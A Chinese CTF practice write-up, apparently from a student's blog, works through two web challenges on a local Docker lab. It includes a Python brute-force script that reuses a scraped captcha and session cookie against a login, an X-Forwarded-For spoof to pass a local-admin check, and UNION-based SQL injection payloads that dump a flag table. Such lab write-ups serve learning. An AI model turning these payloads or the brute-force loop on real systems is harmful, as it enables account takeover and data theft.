      <![CDATA[<p>在这个中秋假的第二天，经历了两天的出门<s>瞎逛</s>后，kur0sia决定继续他的ctf题目，并用docker在本地靶场做了第一道web题。他尚且不知道自己能不能在国庆后的招新赛中进入天璇merak，也不知道自己使用agent的实际操作到底能不能通过之后的wp，就这样在宿舍里头看着我们的题目……总之，clo是决定要先看看去年题，来准备一下招新了！</p><h2 id="T1-EZ-login">T1-EZ_login</h2><p>这题说实话可一点都不easy…综合程度比moe难了不少：</p><h3 id="刚进入：">刚进入：</h3><p>刚进入显示一个登陆系统，有用户名，密码，验证码三栏。用户名就是admin，密码未知，验证码……看着挺好的。我们没有入手点，先看源码吧：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;login-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>管理员登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>验证码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;captcha-images&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/6.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/2.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/1.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/captcha_images/3.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;captcha-digit&quot;</span>&gt;</span></span><br><span class="line">                    </span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;captcha&quot;</span> <span class="attr">name</span>=<span class="string">&quot;captcha&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意到body是这么写的，但其中验证码非常神奇，是由对应的数字对应上具体图片形成“验证码”，我们可以直接使用正则表达式把每次的验证码抓出来，事实上是形同虚设了。</p><h3 id="试验登录逻辑：">试验登录逻辑：</h3><p>我们不知道密码，但是这么一个可怜的本地网站可以直接爆破干穿。这里我们先试验一下登录的逻辑：</p><ul><li>在验证码正确但是密码错误的情况下，会返回账号或密码错误；</li><li>在验证码错误，密码不知道（废话，知道我一会还爆破个蛋）的情况下，会返回验证码错误。</li><li>试着抓一个包，然后发现，对于每次不同的验证码，在反复使用任意一次cookie的情况下，可以一直登录（后端没有机制杀掉老旧cookie）。感谢tsctf官方的wp（笑</li></ul><p>这样一来我们就可以放心的写一个爆破的简单脚本了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://127.0.0.1:1000/login&quot;</span></span><br><span class="line">WORDLIST = <span class="string">&quot;/home/clolinux/rockyou.txt&quot;</span></span><br><span class="line"></span><br><span class="line">page = requests.get(URL, timeout=<span class="number">10</span>)</span><br><span class="line">cookie = page.cookies.get(<span class="string">&quot;session&quot;</span>)</span><br><span class="line">captcha = <span class="string">&quot;&quot;</span>.join(re.findall(<span class="string">r&quot;/static/captcha_images/(\d)\.png&quot;</span>, page.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(WORDLIST, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;latin-1&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(f, <span class="number">1</span>):</span><br><span class="line">pw = line.rstrip(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">rr = requests.post(URL,</span><br><span class="line">                           data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: pw,          <span class="comment"># 修复③：真的把 pw 发出去</span></span><br><span class="line">                                 <span class="string">&quot;captcha&quot;</span>: captcha&#125;,     <span class="comment"># 修复⑤：带上 captcha</span></span><br><span class="line">                           cookies=&#123;<span class="string">&quot;session&quot;</span>: cookie&#125;, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;验证码错误&quot;</span> <span class="keyword">in</span> rr.text:</span><br><span class="line">            <span class="keyword">raise</span> SystemExit(<span class="string">f&quot;[-] 第 <span class="subst">&#123;i&#125;</span> 次请求验证码失效&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;用户名或密码错误&quot;</span> <span class="keyword">in</span> rr.text:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] 成功！password = <span class="subst">&#123;pw&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>我们可以得到密码为simple，登录，发现：“<strong>你似乎不是本地管理员</strong>”。所以我们在请求里加入XFF即可，token里头就是一个没加密的flag。</p><p>P.S：一些dsh的补充：</p><blockquote><p>验证码的安全价值不在&quot;图片长得难不难认&quot;，而在于<strong>答案是否只为服务端所知、且只用一次</strong>。这道题的图片连干扰线都懒得加，答案还是服务端亲手写成文字递过来的——它看起来像一道门，实际是一张贴在门上的钥匙。</p><p><strong>无状态 Cookie 在原理上无法表达&quot;一次性&quot;</strong>。Cookie 能<strong>携带</strong>数据，不能<strong>消费</strong>数据——没有&quot;这个值已用过&quot;的概念。要一次性就必须有服务端状态（Redis 存 <code>sid→answer</code>，校验后 <code>DEL</code> + 过期）。</p><p><strong>信息不只在页面里，也在响应头里</strong>。登录后页面&quot;啥也没有&quot;，但 <code>Set-Cookie</code> 里躺着 token。这是黑盒题的基本功：抓包看完整响应，不只盯渲染结果。</p></blockquote><h2 id="T2-ez-sql">T2-ez_sql</h2><p>打开后发现是一个叫Vulnerability Database的玩意，反正根据题目来说就是一个sql注入。首先规规矩矩尝试1~8，发现是随便写了些web的具体漏洞。但是和flag没什么关系。但既然是sql，我们自然是先用原来那几步试试的好：</p><p><code>1' #</code>   这个正常，说明可以带引号（事实上是下一个order by的时候，数字型没用</p><p><code>1' Order by 3 ; #</code>  到4报错，说明就只有显示的那三行</p><p><code>-1' UNION SELECT 111,schema_name,database()  from information_schema.schemata; #</code></p><img src="D:\03-Photo\Screenshots\屏幕截图 2026-09-26 220202.png" style="zoom:43%;" /><p><code>-1' UNION SELECT 111,database(),table_name  from information_schema.tables where table_schema = database(); #</code></p><img src="D:\03-Photo\Screenshots\屏幕截图 2026-09-26 220450.png" style="zoom:43%;" /><p><code>-1' UNION SELECT 111,database(),column_name  from information_schema.columns where table_schema = database() and table_name = &quot;flag&quot;; #</code></p><img src="D:\03-Photo\Screenshots\屏幕截图 2026-09-26 220607.png" style="zoom:43%;" /><p>一直到这里都没什么问题，我们满怀期待地尝试<code>-1' union select 111, 222, flag from flag; #</code> 试图就此搞到flag。但是……</p><p>但是到这里，发现union突然被ban了，怎么你之前就不ban😡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*No results found for ID: -1&#x27; union select 111, 222, flag from flag; #*</span><br><span class="line">Error: Illegal mix of collations for operation &#x27;UNION&#x27;</span><br></pre></td></tr></table></figure><p>询问ds网页版老师，发现：</p><blockquote><p>你遇到的 <code>Illegal mix of collations for operation 'UNION'</code> 错误，核心原因是<strong>SQL语句中参与 <code>UNION</code> 查询的各列，其字符集（Collation）不一致，MySQL 无法决定用哪一个规则来合并结果</strong>。</p><h3 id="🧐-为什么会报这个错？">🧐 为什么会报这个错？</h3><p>在 SQL 注入中，你构造的 <code>-1' union select 111, 222, flag from flag; #</code> 会和原查询合并。原查询的列（如 <code>first_name</code>）有自己的字符集，而你注入的 <code>flag</code> 列或字符串常量 <code>111</code>、<code>222</code> 也可能有各自的字符集。当这些字符集不匹配时，<code>UNION</code> 操作就无法进行，从而抛出此错误。</p><p>这在 <strong>DVWA</strong> 等靶场中很常见，因为靶场数据库的 <code>users</code> 表和 <code>information_schema</code> 等系统表的字符集可能不同（例如一个是 <code>utf8_general_ci</code>，另一个是 <code>utf8_unicode_ci</code>）</p></blockquote><p>改成<code>-1' union select 111, 222, CONVERT(flag using utf8) from flag; #</code> convert一下编码即可。</p>]]>
